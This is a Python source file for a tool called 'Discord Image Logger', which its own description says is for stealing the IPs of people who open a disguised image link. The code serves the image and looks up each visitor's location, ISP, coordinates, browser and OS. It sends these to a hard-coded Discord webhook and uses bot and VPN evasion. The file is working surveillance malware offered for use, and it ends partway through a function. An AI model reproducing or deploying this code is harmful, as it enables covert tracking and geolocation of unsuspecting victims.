# discord.gg/wingsminer
# Thanks for help DLB, finkyy
# Don't change any settings. This can be this may prevent the code from working.
#
# █     █░█ ██▄    █   ▄████   ██████  ███▄ ▄███▓ ██▓ ███▄    █ ▓█████  ██▀███  
#▓█░ █ ░█░█ █ ▀█   █  ██▒ ▀█▒▒██    ▒ ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
#▒█░ █ ░█▓█ █  ▀█ ██▒▒██░▄▄▄░░ ▓██▄   ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
#░█░ █ ░█▓█ █▒  ▐▌██▒░▓█  ██▓  ▒   ██▒▒██    ▒██ ░██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
#░░██▒██▓▒█ █░   ▓██░░▒▓███▀▒▒██████▒▒▒██▒   ░██▒░██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
#░ ▓░▒ ▒ ░ ▒░   ▒ ▒  ░▒   ▒ ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
#  ▒ ░ ░ ░ ░░   ░ ▒░  ░   ░ ░ ░▒  ░ ░░  ░      ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
#  ░   ░    ░   ░ ░ ░ ░   ░ ░  ░  ░  ░      ░    ▒ ░   ░   ░ ░    ░     ░░   ░ 
#    ░            ░       ░       ░         ░    ░           ░    ░  ░   ░     

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "lynxWings"

config = {
    "webhook": "https://discord.com/api/webhooks/1142229994148462625/jKWMD7v2EC675ul76MXKwadCD_ZfqnroLr-AlvP65PyvzrypziOCRPyuUOfio2-W-RzE", # <------------------------- Put your webhook link here.
    "image": "data:image/png;base64,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", # <------------------------- Put image address link here.
    "imageArgument": True,

    "username": "Skiddoz",
    "color": 0x03AC13,

    "crashBrowser": False,
    
    "accurateLocation": False,

    "message": { 
        "doMessage": False,
        "message": ".",
        "richMessage": True,
    },

    "vpnCheck": 1, 

    "linkAlerts": False,
    "buggedImage": True,

    "antiBot": 1,

    "redirect": {
        "redirect": True,
        "page": "7rab on top" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Skiddoz Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Skiddoz link sent.",
            "color": config["color"],
            "description": f"Link sent successfully.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "."

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "",
            "color": config["color"],
            "description": f"""```The user has clicked the image. IP successfully grabbed. <WingsServices>
            
> IP:
{ip if ip else 'unknown'}

> Country / City:
{info['country'] if info['country'] else 'unknown'} / {info['city'] if info['city'] else 'unknown'}

> Provider:
{info['isp'] if info['isp'] else 'unknown'}

> Coords:
{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})

> Timezone:
{info['timezone'].split('/')[0]}

> VPN:
{info['proxy']}

> ASN:
{info['as'] if info['as'] else 'unknown'}

> Browser:
{browser}

> OS:
{os}

> User Agent:
{useragent}
```""",
    }
  ],
}

    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: self.wfile.write(binaries["loading"])

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
